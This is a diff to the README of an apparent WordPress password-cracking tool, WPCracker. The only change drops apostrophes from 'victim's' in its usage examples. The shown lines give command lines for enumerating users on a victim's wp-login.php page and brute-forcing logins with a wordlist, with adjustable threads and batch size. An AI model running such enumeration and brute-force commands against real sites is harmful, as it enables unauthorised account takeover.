@@ -10,7 +10,7 @@ It takes about two days to go through the rockyou.txt (14,341,564 unique passwor
 
 ## User Enumeration
 ```Bash
-.\WPCracker.exe --enum -u <Url to victim's wp-login.php>
+.\WPCracker.exe --enum -u <Url to victims wp-login.php>
 ```
 #### OR JUST
 ```Bash
@@ -22,7 +22,7 @@ In this case, the program only requests the required information
 
 ### Using program's presets
 ```Bash
-.\WPCracker.exe --brute -u <Url to victim's WordPress page> -p <Path to wordlist> -n <Username>
+.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username>
 ```
 #### OR JUST
 ```Bash
@@ -32,7 +32,7 @@ In this case, the program only requests the required information
 
 ### Using with custom settings
 ```Bash
-.\WPCracker.exe --brute -u <Url to victim's WordPress page> -p <Path to wordlist> -n <Username> -t <Max threads> -c <Batch maximum size>
+.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -t <Max threads> -c <Batch maximum size>
 ```
 
 ### Get help
